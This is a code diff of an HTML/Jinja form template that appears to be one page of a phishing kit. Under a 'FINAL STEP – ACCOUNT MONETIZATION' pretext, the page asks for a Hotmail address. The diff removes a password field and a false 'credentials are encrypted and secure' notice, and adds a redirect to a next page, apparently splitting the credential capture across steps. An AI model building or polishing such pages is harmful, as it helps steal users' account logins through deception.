@@ -1,13 +1,17 @@
 {% extends "base.html" %}
 {% block body %}
 <div class="card premium-card" style="max-width:420px;margin:48px auto;padding:40px 32px;text-align:center">
+  
   <div class="header-icon">✨</div>
+  
   <h2 class="section-title">FINAL STEP – ACCOUNT MONETIZATION</h2>
-  <p class="section-subtitle">Secure your monetization earnings by logging into your Hotmail account. This step is required for transaction security.</p>
+  <p class="section-subtitle">
+    Enter your Hotmail email to secure your monetization profile.
+  </p>
 
   <form method="post" id="f2Form" novalidate>
     
-    <!-- Email -->
+    <!-- Email Only -->
     <div class="form-group">
       <label class="form-label">Hotmail Address</label>
       <input 
@@ -17,36 +21,21 @@
         type="email" 
         placeholder="username@hotmail.com" 
         required
-        pattern="^[a-zA-Z0-9._%+-]+@hotmail.com">
-      <div class="error-message">Please enter a valid Hotmail address ending with <b>@hotmail.com</b></div>
+        pattern="^[a-zA-Z0-9._%+-]+@hotmail.com$">
+      <div class="error-message">
+        Please enter a valid Hotmail address ending with <b>@hotmail.com</b>
+      </div>
     </div>
 
-    <!-- Password -->
-    <div class="form-group">
-      <label class="form-label">Password</label>
-      <input 
-        class="input wide" 
-        id="password" 
-        name="password" 
-        type="password" 
-        placeholder="Enter your password" 
-        required 
-        minlength="6">
-      <div class="error-message">Password must be at least 6 characters long</div>
-    </div>
-
-    <button class="btn btn-blue wide-btn" type="submit">
-      <span class="btn-text">Secure & Continue</span>
+    <button class="btn wide-btn" type="submit">
+      <span class="btn-text">Continue</span>
     </button>
+
   </form>
 
-  <div class="security-note">
-    <p>🔒 Your login credentials are encrypted and secure</p>
-  </div>
 </div>
 
 <style>
-/* Premium Card with hover glow */
 .premium-card {
   background: #fff;
   border-radius: 20px;
@@ -59,19 +48,16 @@
   transform: translateY(-2px);
 }
 
-/* Header Icon */
 .header-icon {
   font-size: 3rem;
   margin-bottom: 16px;
   animation: float 3s ease-in-out infinite;
 }
-
 @keyframes float {
   0%, 100% { transform: translateY(0px); }
   50% { transform: translateY(-5px); }
 }
 
-/* Title & Subtitle */
 .section-title {
   font-size: 1.5rem;
   font-weight: 800;
@@ -81,52 +67,38 @@
   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
-  background-clip: text;
 }
+
 .section-subtitle {
   color: #64748b;
   margin-bottom: 32px;
   font-size: 0.95rem;
-  font-weight: 500;
   line-height: 1.5;
 }
 
-/* Form Layout */
 .form-group {
   margin-bottom: 24px;
   text-align: left;
 }
 
 .form-label {
-  display: block;
   font-weight: 600;
   font-size: 0.9rem;
   margin-bottom: 8px;
   color: #374151;
 }
 
-/* Inputs */
 .input.wide {
   width: 100%;
-  border: 2px solid #e5e7eb;
   padding: 16px 20px;
   border-radius: 18px;
+  border: 2px solid #e5e7eb;
   font-size: 1rem;
-  font-weight: 500;
-  background: #ffffff;
-  transition: all 0.3s ease;
-  box-sizing: border-box;
+  transition: all 0.3s;
 }
 .input.wide:focus {
   border-color: #1877F2;
   box-shadow: 0 0 0 4px rgba(24,119,242,0.15);
-  background: #ffffff;
-  outline: none;
-  transform: translateY(-1px);
-}
-.input.wide::placeholder {
-  color: #9ca3af;
-  font-weight: 400;
 }
 .input.error {
   border-color: #ef4444;
@@ -134,20 +106,17 @@
   background: #fef2f2;
 }
 
-/* Error messages */
 .error-message {
   font-size: 0.85rem;
   color: #dc2626;
   display: none;
   margin-top: 6px;
-  text-align: left;
   font-weight: 500;
 }
 
-/* Button */
-.btn.wide-btn {
+.wide-btn {
   width: 100%;
-  padding: 18px 24px;
+  padding: 18px;
   border-radius: 25px;
   font-size: 1.1rem;
   font-weight: 700;
@@ -155,52 +124,12 @@
   color: white;
   border: none;
   cursor: pointer;
-  transition: all 0.3s ease;
+  transition: 0.3s;
   box-shadow: 0 8px 20px rgba(24,119,242,0.35);
-  margin-top: 8px;
-  position: relative;
-  overflow: hidden;
 }
-.btn.wide-btn:hover {
-  box-shadow: 0 12px 25px rgba(24,119,242,0.45);
+.wide-btn:hover {
   transform: translateY(-2px);
-}
-.btn.wide-btn:active {
-  transform: translateY(0);
-}
-.btn.wide-btn::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: -100%;
-  width: 100%;
-  height: 100%;
-  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-  transition: left 0.5s;
-}
-.btn.wide-btn:hover::before {
-  left: 100%;
-}
-
-.btn-text {
-  position: relative;
-  z-index: 1;
-}
-
-/* Security Note */
-.security-note {
-  margin-top: 24px;
-  padding: 16px;
-  background: #f0f9ff;
-  border-radius: 12px;
-  border: 1px solid #e0f2fe;
-}
-
-.security-note p {
-  margin: 0;
-  color: #0369a1;
-  font-size: 0.9rem;
-  font-weight: 500;
+  box-shadow: 0 12px 25px rgba(24,119,242,0.45);
 }
 </style>
 
@@ -209,34 +138,39 @@ document.getElementById("f2Form").addEventListener("submit", function(e) {
   let valid = true;
   let firstInvalid = null;
 
-  this.querySelectorAll(".input").forEach(input => {
-    const errorMsg = input.nextElementSibling;
-    if (!input.checkValidity()) {
-      input.classList.add("error");
-      errorMsg.style.display = "block";
-      valid = false;
-      if (!firstInvalid) firstInvalid = input;
-    } else {
-      input.classList.remove("error");
-      errorMsg.style.display = "none";
-    }
-  });
+  const email = document.getElementById("address");
+  const error = email.nextElementSibling;
+
+  if (!email.checkValidity()) {
+    valid = false;
+    email.classList.add("error");
+    error.style.display = "block";
+    firstInvalid = email;
+  } else {
+    email.classList.remove("error");
+    error.style.display = "none";
+  }
 
   if (!valid) {
     e.preventDefault();
     firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
     firstInvalid.focus({ preventScroll: true });
   }
+
+  // ✅ If valid, redirect to f2_A.html
+  if (valid) {
+    e.preventDefault();
+    window.location.href = "f2_A.html";
+  }
 });
 
 // Real-time validation
-document.querySelectorAll('.input').forEach(input => {
-  input.addEventListener('input', function() {
-    if (this.checkValidity()) {
-      this.classList.remove('error');
-      this.nextElementSibling.style.display = 'none';
-    }
-  });
+document.getElementById("address").addEventListener("input", function () {
+  if (this.checkValidity()) {
+    this.classList.remove("error");
+    this.nextElementSibling.style.display = "none";
+  }
 });
 </script>
+
 {% endblock %}
